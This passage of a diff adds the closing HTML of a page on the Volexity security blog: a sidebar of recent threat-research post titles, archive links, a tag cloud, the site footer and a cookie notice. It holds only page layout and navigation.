+               value="" name="s"
+               title="Search for:" />
+    </label>
+    <input type="submit" class="search-submit"
+           value="Search" />
+</form></div></li>
+		<li class="widget widget_recent_entries"><div class="widget-content">
+		<h4 class="widget-title">Recent Posts</h4>
+		<ul>
+											<li>
+					<a href="https://www.volexity.com/blog/2021/08/24/north-korean-bluelight-special-inkysquid-deploys-rokrat/" aria-current="page">North Korean BLUELIGHT Special: InkySquid Deploys RokRAT</a>
+									</li>
+											<li>
+					<a href="https://www.volexity.com/blog/2021/08/17/north-korean-apt-inkysquid-infects-victims-using-browser-exploits/">North Korean APT InkySquid Infects Victims Using Browser Exploits</a>
+									</li>
+											<li>
+					<a href="https://www.volexity.com/blog/2021/05/27/suspected-apt29-operation-launches-election-fraud-themed-phishing-campaigns/">Suspected APT29 Operation Launches Election Fraud Themed Phishing Campaigns</a>
+									</li>
+											<li>
+					<a href="https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/">Operation Exchange Marauder: Active Exploitation of Multiple Zero-Day Microsoft Exchange Vulnerabilities</a>
+									</li>
+											<li>
+					<a href="https://www.volexity.com/blog/2020/12/16/responding-to-the-solarwinds-breach/">Responding to the SolarWinds Breach: Detect, Prevent, and Remediate the Dark Halo Supply Chain Attack</a>
+									</li>
+					</ul>
+
+		</div></li><li class="widget widget_archive"><div class="widget-content"><h4 class="widget-title">Archives</h4>
+			<ul>
+					<li><a href='https://www.volexity.com/blog/2021/08/'>August 2021</a></li>
+	<li><a href='https://www.volexity.com/blog/2021/05/'>May 2021</a></li>
+	<li><a href='https://www.volexity.com/blog/2021/03/'>March 2021</a></li>
+	<li><a href='https://www.volexity.com/blog/2020/12/'>December 2020</a></li>
+	<li><a href='https://www.volexity.com/blog/2020/11/'>November 2020</a></li>
+	<li><a href='https://www.volexity.com/blog/2020/04/'>April 2020</a></li>
+	<li><a href='https://www.volexity.com/blog/2020/03/'>March 2020</a></li>
+	<li><a href='https://www.volexity.com/blog/2019/09/'>September 2019</a></li>
+	<li><a href='https://www.volexity.com/blog/2018/11/'>November 2018</a></li>
+	<li><a href='https://www.volexity.com/blog/2018/09/'>September 2018</a></li>
+	<li><a href='https://www.volexity.com/blog/2018/08/'>August 2018</a></li>
+	<li><a href='https://www.volexity.com/blog/2018/07/'>July 2018</a></li>
+	<li><a href='https://www.volexity.com/blog/2018/06/'>June 2018</a></li>
+	<li><a href='https://www.volexity.com/blog/2018/04/'>April 2018</a></li>
+	<li><a href='https://www.volexity.com/blog/2017/11/'>November 2017</a></li>
+	<li><a href='https://www.volexity.com/blog/2017/07/'>July 2017</a></li>
+	<li><a href='https://www.volexity.com/blog/2017/03/'>March 2017</a></li>
+	<li><a href='https://www.volexity.com/blog/2016/11/'>November 2016</a></li>
+	<li><a href='https://www.volexity.com/blog/2015/10/'>October 2015</a></li>
+	<li><a href='https://www.volexity.com/blog/2015/07/'>July 2015</a></li>
+	<li><a href='https://www.volexity.com/blog/2015/06/'>June 2015</a></li>
+	<li><a href='https://www.volexity.com/blog/2015/04/'>April 2015</a></li>
+	<li><a href='https://www.volexity.com/blog/2014/10/'>October 2014</a></li>
+	<li><a href='https://www.volexity.com/blog/2014/09/'>September 2014</a></li>
+			</ul>
+
+			</div></li><li class="widget widget_categorizedtagcloudwidget"><div class="widget-content"><h4 class="widget-title">Tags</h4>
+    <div id="categorized-tag-cloud"><span id="categorized-tag-cloud-el-1"><a href="https://www.volexity.com/blog/tag/dukes/" class="tag-cloud-link tag-link-43 tag-link-position-1" style="font-size: 10pt;" aria-label="Dukes (2 items)">Dukes</a></span> <span id="categorized-tag-cloud-el-2"><a href="https://www.volexity.com/blog/tag/china/" class="tag-cloud-link tag-link-42 tag-link-position-2" style="font-size: 11.5pt;" aria-label="China (3 items)">China</a></span> <span id="categorized-tag-cloud-el-3"><a href="https://www.volexity.com/blog/tag/spear-phishing/" class="tag-cloud-link tag-link-45 tag-link-position-3" style="font-size: 10pt;" aria-label="spear phishing (2 items)">spear phishing</a></span> <span id="categorized-tag-cloud-el-4"><a href="https://www.volexity.com/blog/tag/digital-surveillance/" class="tag-cloud-link tag-link-36 tag-link-position-4" style="font-size: 10pt;" aria-label="digital surveillance (2 items)">digital surveillance</a></span> <span id="categorized-tag-cloud-el-5"><a href="https://www.volexity.com/blog/tag/crimeware/" class="tag-cloud-link tag-link-68 tag-link-position-5" style="font-size: 10pt;" aria-label="crimeware (2 items)">crimeware</a></span> <span id="categorized-tag-cloud-el-6"><a href="https://www.volexity.com/blog/tag/solarwinds/" class="tag-cloud-link tag-link-112 tag-link-position-6" style="font-size: 10pt;" aria-label="solarwinds (2 items)">solarwinds</a></span> <span id="categorized-tag-cloud-el-7"><a href="https://www.volexity.com/blog/tag/exploit/" class="tag-cloud-link tag-link-87 tag-link-position-7" style="font-size: 10pt;" aria-label="Exploit (2 items)">Exploit</a></span> <span id="categorized-tag-cloud-el-8"><a href="https://www.volexity.com/blog/tag/malware/" class="tag-cloud-link tag-link-106 tag-link-position-8" style="font-size: 10pt;" aria-label="malware (2 items)">malware</a></span> <span id="categorized-tag-cloud-el-9"><a href="https://www.volexity.com/blog/tag/inkysquid/" class="tag-cloud-link tag-link-118 tag-link-position-9" style="font-size: 10pt;" aria-label="InkySquid (2 items)">InkySquid</a></span> <span id="categorized-tag-cloud-el-10"><a href="https://www.volexity.com/blog/tag/scanning/" class="tag-cloud-link tag-link-31 tag-link-position-10" style="font-size: 12.75pt;" aria-label="Scanning (4 items)">Scanning</a></span> <span id="categorized-tag-cloud-el-11"><a href="https://www.volexity.com/blog/tag/japan/" class="tag-cloud-link tag-link-38 tag-link-position-11" style="font-size: 10pt;" aria-label="Japan (2 items)">Japan</a></span> <span id="categorized-tag-cloud-el-12"><a href="https://www.volexity.com/blog/tag/oceanlotus/" class="tag-cloud-link tag-link-51 tag-link-position-12" style="font-size: 10pt;" aria-label="OceanLotus (2 items)">OceanLotus</a></span> <span id="categorized-tag-cloud-el-13"><a href="https://www.volexity.com/blog/tag/exploits/" class="tag-cloud-link tag-link-33 tag-link-position-13" style="font-size: 17pt;" aria-label="exploits (10 items)">exploits</a></span> <span id="categorized-tag-cloud-el-14"><a href="https://www.volexity.com/blog/tag/vulnerabilities/" class="tag-cloud-link tag-link-34 tag-link-position-14" style="font-size: 12.75pt;" aria-label="vulnerabilities (4 items)">vulnerabilities</a></span> <span id="categorized-tag-cloud-el-15"><a href="https://www.volexity.com/blog/tag/north-korea/" class="tag-cloud-link tag-link-117 tag-link-position-15" style="font-size: 10pt;" aria-label="North Korea (2 items)">North Korea</a></span> <span id="categorized-tag-cloud-el-16"><a href="https://www.volexity.com/blog/tag/vietnam/" class="tag-cloud-link tag-link-52 tag-link-position-16" style="font-size: 10pt;" aria-label="Vietnam (2 items)">Vietnam</a></span> <span id="categorized-tag-cloud-el-17"><a href="https://www.volexity.com/blog/tag/osx/" class="tag-cloud-link tag-link-49 tag-link-position-17" style="font-size: 10pt;" aria-label="osx (2 items)">osx</a></span> <span id="categorized-tag-cloud-el-18"><a href="https://www.volexity.com/blog/tag/apt/" class="tag-cloud-link tag-link-35 tag-link-position-18" style="font-size: 20pt;" aria-label="APT (18 items)">APT</a></span> <span id="categorized-tag-cloud-el-19"><a href="https://www.volexity.com/blog/tag/exchange/" class="tag-cloud-link tag-link-88 tag-link-position-19" style="font-size: 10pt;" aria-label="Exchange (2 items)">Exchange</a></span> <span id="categorized-tag-cloud-el-20"><a href="https://www.volexity.com/blog/tag/drupal/" class="tag-cloud-link tag-link-40 tag-link-position-20" style="font-size: 10pt;" aria-label="Drupal (2 items)">Drupal</a></span> </div>
+  	<style>
+  	
+  		#categorized-tag-cloud a, #categorized-tag-cloud a:visited { text-decoration:none; }
+      #categorized-tag-cloud a:hover { text-decoration:none; color:#3b97d3; }
+    		#categorized-tag-cloud-el-1 a, #categorized-tag-cloud-el-1 a:visited { color:#555555; }
+    		#categorized-tag-cloud-el-2 a, #categorized-tag-cloud-el-2 a:visited { color:#555555; }
+    		#categorized-tag-cloud-el-3 a, #categorized-tag-cloud-el-3 a:visited { color:#555555; }
+    		#categorized-tag-cloud-el-4 a, #categorized-tag-cloud-el-4 a:visited { color:#555555; }
+    		#categorized-tag-cloud-el-5 a, #categorized-tag-cloud-el-5 a:visited { color:#555555; }
+    		#categorized-tag-cloud-el-6 a, #categorized-tag-cloud-el-6 a:visited { color:#555555; }
+    		#categorized-tag-cloud-el-7 a, #categorized-tag-cloud-el-7 a:visited { color:#555555; }
+    		#categorized-tag-cloud-el-8 a, #categorized-tag-cloud-el-8 a:visited { color:#555555; }
+    		#categorized-tag-cloud-el-9 a, #categorized-tag-cloud-el-9 a:visited { color:#555555; }
+    		#categorized-tag-cloud-el-10 a, #categorized-tag-cloud-el-10 a:visited { color:#555555; }
+    		#categorized-tag-cloud-el-11 a, #categorized-tag-cloud-el-11 a:visited { color:#555555; }
+    		#categorized-tag-cloud-el-12 a, #categorized-tag-cloud-el-12 a:visited { color:#555555; }
+    		#categorized-tag-cloud-el-13 a, #categorized-tag-cloud-el-13 a:visited { color:#555555; }
+    		#categorized-tag-cloud-el-14 a, #categorized-tag-cloud-el-14 a:visited { color:#555555; }
+    		#categorized-tag-cloud-el-15 a, #categorized-tag-cloud-el-15 a:visited { color:#555555; }
+    		#categorized-tag-cloud-el-16 a, #categorized-tag-cloud-el-16 a:visited { color:#555555; }
+    		#categorized-tag-cloud-el-17 a, #categorized-tag-cloud-el-17 a:visited { color:#555555; }
+    		#categorized-tag-cloud-el-18 a, #categorized-tag-cloud-el-18 a:visited { color:#555555; }
+    		#categorized-tag-cloud-el-19 a, #categorized-tag-cloud-el-19 a:visited { color:#555555; }
+    		#categorized-tag-cloud-el-20 a, #categorized-tag-cloud-el-20 a:visited { color:#555555; }
+  	</style></div></li>	</ul>
+</aside>	</section>
+</div>	</main>
+
+	<footer class="footer">
+	<div class="footer-container container">
+        <div class="footer-col-first col-md-3 no-padding">
+            <a class="footer-logo" href="https://www.volexity.com"><img src="https://www.volexity.com/wp-content/themes/volexity/dist/images/logo.png" alt="Volexity"></a>
+            <address class="footer-copyright">&copy; 2021 Volexity. All Rights Reserved.</address>
+        </div>
+		<ul id="menu-footer-menu" class="footer-menu-list col-md-4 col-xs-12"><li id="menu-item-57" class="nav-header menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-57"><a href="/company/about/">About</a>
+<ul class="sub-menu">
+	<li id="menu-item-59" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-59"><a href="https://www.volexity.com/company/about/">About Us</a></li>
+	<li id="menu-item-58" class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-58"><a href="https://www.volexity.com/blog/">Blog</a></li>
+	<li id="menu-item-395" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-395"><a href="https://www.volexity.com/privacy-policy/">Privacy Policy</a></li>
+</ul>
+</li>
+<li id="menu-item-60" class="nav-header menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-60"><a href="/solutions/">Solutions</a>
+<ul class="sub-menu">
+	<li id="menu-item-400" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-400"><a href="https://www.volexity.com/company/contact/">Request A Demo</a></li>
+	<li id="menu-item-61" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-61"><a href="https://www.volexity.com/products-overview/">Products</a></li>
+	<li id="menu-item-669" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-669"><a href="https://www.volexity.com/services-overview/">Services</a></li>
+</ul>
+</li>
+</ul>
+        <div class="footer-address col-md-3 col-xs-12">
+            <p class="footer-header">Contact</p>
+            <ul>
+                <li class="footer-address--address icon-location-marker">11654 Plaza America Dr #774<br />Reston, VA 20190-4700</li>
+                <li class="footer-address--phone icon-phone-mobile">1-888-825-1975</li>
+            </ul>
+        </div>
+        <div class="footer-social col-md-2 no-padding">
+            <p class="footer-header">Connect</p>
+            <ul>
+                <li class="footer-social-holder"><a href="https://www.facebook.com/volexity" target="_blank" class="icon-facebook footer-social--link"></a></li>
+                <li class="footer-social-holder"><a href="https://twitter.com/volexity" target="_blank" class="icon-twitter footer-social--link"></a></li>
+                <li class="footer-social-holder"><a href="https://www.linkedin.com/company/volexity" target="_blank" class="icon-linkedin footer-social--link"></a></li>
+            </ul>
+        </div>
+	</div>
+    <div id="back-to-top" class="icon-slide-left"></div>
+	<script type='text/javascript' id='main-js-extra'>
+/* <![CDATA[ */
+var urls = {"base":"https:\/\/www.volexity.com","theme":"https:\/\/www.volexity.com\/wp-content\/themes\/volexity","ajax":"https:\/\/www.volexity.com\/wp-admin\/admin-ajax.php"};
+var info = [];
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://www.volexity.com/wp-content/themes/volexity/dist/scripts/scripts.min.js?ver=5.8' id='main-js'></script>
+<script type='text/javascript' src='https://www.volexity.com/wp-includes/js/comment-reply.min.js?ver=5.8' id='comment-reply-js'></script>
+<script type='text/javascript' src='https://www.volexity.com/wp-includes/js/wp-embed.min.js?ver=5.8' id='wp-embed-js'></script>
+
+		<!-- Cookie Notice plugin v2.1.0 by Hu-manity.co https://hu-manity.co/ -->
+		<div id="cookie-notice" role="banner" class="cookie-notice-hidden cookie-revoke-hidden cn-position-bottom" aria-label="Cookie Notice" style="background-color: rgba(0,0,0,1);"><div class="cookie-notice-container" style="color: #fff;"><span id="cn-notice-text" class="cn-text-container">This Website uses cookies, which are necessary to its functioning and required to achieve the purposes illustrated in our <a href="/privacy-policy/#cookies">Cookie Policy</a>. By clicking the button, you consent to our use of cookies.</span><span id="cn-notice-buttons" class="cn-buttons-container"><a href="#" id="cn-accept-cookie" data-cookie-set="accept" class="cn-set-cookie cn-button box-cta" aria-label="Agree & Close">Agree & Close</a></span><a href="javascript:void(0);" id="cn-close-notice" data-cookie-set="accept" class="cn-close-icon" aria-label="Agree & Close"></a></div>
+			
+		</div>
+		<!-- / Cookie Notice plugin --></footer></body>
+</html>
